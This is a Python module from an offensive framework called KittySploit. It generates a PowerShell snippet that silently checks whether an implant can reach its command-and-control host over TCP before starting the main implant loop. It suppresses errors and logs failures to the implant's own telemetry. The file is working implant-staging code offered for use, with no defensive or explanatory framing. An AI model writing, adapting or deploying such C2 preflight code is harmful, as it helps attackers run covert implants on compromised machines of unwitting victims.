#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Any, Dict

from kittysploit import *


class Module(Prestage):
    PRESTAGE_ID = "network_preflight"

    __info__ = {
        "name": "Network Preflight (PowerShell)",
        "description": "Probe callback reachability before entering the main implant loop",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "platform": Platform.MULTI,
        "languages": ["powershell"],
        "prestage_dependencies": ["telemetry_buffer"],
        "tags": ["prestage", "offline", "network", "powershell"],
    }

    timeout = OptString("3", "TCP connect timeout in seconds", False)

    def generate_powershell(self, context: Dict[str, Any] = None) -> str:
        ctx = dict(context or {})
        c2_host = str(ctx.get("c2_host") or "").replace("'", "''")
        c2_port = int(ctx.get("c2_port") or 8088)
        if not c2_host:
            return "# network_preflight: set lhost on payload"
        return f"""
$ErrorActionPreference='SilentlyContinue'
$global:_kitty_network_preflight=@{{ ok=$false; error='' }}
try {{
  $client=New-Object System.Net.Sockets.TcpClient
  $iar=$client.BeginConnect('{c2_host}',{c2_port},$null,$null)
  if($iar.AsyncWaitHandle.WaitOne(3000,$false)){{ $client.EndConnect($iar)|Out-Null; $global:_kitty_network_preflight.ok=$true }}
  $client.Close()
}} catch {{
  $global:_kitty_network_preflight.error=$_.Exception.Message
  try {{ _KittyTelemetryRecord 'network_preflight' 'failed' $global:_kitty_network_preflight.error }} catch {{}}
}}
""".strip()
